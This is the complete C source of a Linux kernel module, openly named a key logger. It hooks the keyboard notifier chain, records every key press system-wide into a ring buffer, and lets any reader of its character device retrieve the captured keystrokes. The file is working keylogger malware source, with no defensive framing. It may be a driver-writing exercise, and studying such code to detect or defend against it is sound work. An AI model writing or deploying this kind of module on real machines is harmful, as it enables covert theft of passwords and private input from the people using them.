#include<linux/fs.h>
#include<linux/init.h>
#include<linux/kernel.h>
#include<linux/module.h>
#include<linux/kthread.h>
#include<asm/uaccess.h>
#include<linux/keyboard.h>

#define BUF_SIZE 1024
#define DEVICE_NAME "Key_Logger"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Ansh");
MODULE_DESCRIPTION("Key Logger Driver...");

static int major_num;
static int head = 0;
static int tail = 0;
static char key_buffer[BUF_SIZE];
static spinlock_t buffer_lock;


static const char keymap[256] = {
    [2] = '1', [3] = '2', [4] = '3', [5] = '4',
    [6] = '5', [7] = '6', [8] = '7', [9] = '8',
    [10] = '9', [11] = '0',

    [16] = 'q', [17] = 'w', [18] = 'e', [19] = 'r',
    [20] = 't', [21] = 'y', [22] = 'u', [23] = 'i',
    [24] = 'o', [25] = 'p',

    [30] = 'a', [31] = 's', [32] = 'd', [33] = 'f',
    [34] = 'g', [35] = 'h', [36] = 'j', [37] = 'k',
    [38] = 'l',

    [44] = 'z', [45] = 'x', [46] = 'c', [47] = 'v',
    [48] = 'b', [49] = 'n', [50] = 'm',

    [57] = ' '
};


static int device_open(struct inode *inode, struct file* filp){
    pr_info("Key Logger: Device Opened...\n");
    return 0;
}

static int device_release(struct inode *inode, struct file* filp){
    pr_info("Key Logger: Device Released...\n");
    return 0;
}


static int keylogger_notify(struct notifier_block *nblock, unsigned long code, void *_param){ 
    struct keyboard_notifier_param *param = _param; 
    
    if(code == KBD_KEYCODE && param->down){ 
        char c = ' ';

        if(param->value < 256 && keymap[param->value] != 0) {
            c = keymap[param->value];
            
            spin_lock(&buffer_lock); 
            key_buffer[head] = c;
            head = (head + 1) % BUF_SIZE; 
    
            if(head == tail) 
                tail = (tail + 1) % BUF_SIZE; 
    
            spin_unlock(&buffer_lock); 
        }

        } 
    return NOTIFY_OK;
}

static ssize_t device_read(struct file *filp, char __user *buffer, size_t len, loff_t *offset){
    int count = 0;
    if(len > BUF_SIZE)
        len = BUF_SIZE;

    char temp_buf[BUF_SIZE];

    spin_lock(&buffer_lock);
    while(tail != head && count < len){
        temp_buf[count] = key_buffer[tail];
        tail = (tail+1) % BUF_SIZE;
        count++;
    }
    spin_unlock(&buffer_lock);

    if(count == 0) return 0;

    if(copy_to_user(buffer, temp_buf, count)){
        return -EFAULT;
    }

    *offset = 0;
    return count;
}


static struct notifier_block nblk ={
    .notifier_call = keylogger_notify
};


static struct file_operations fops = {
    .owner = THIS_MODULE,
    .read = device_read,
    .open = device_open,
    .release = device_release
};


static int __init my_init(void){
    spin_lock_init(&buffer_lock);

    major_num = register_chrdev(0, DEVICE_NAME, &fops);
    if(major_num < 0){
        pr_err("Keylogger: Device Not Registered...\n");
        return major_num;
    }
    register_keyboard_notifier(&nblk);

    pr_info("Device Registered With major_num: %d\n", major_num);
    return 0;
}


static void __exit my_exit(void){
    unregister_chrdev(major_num, DEVICE_NAME);
    unregister_keyboard_notifier(&nblk);
    pr_info("Device Unregistered...\n");
}


module_init(my_init);
module_exit(my_exit);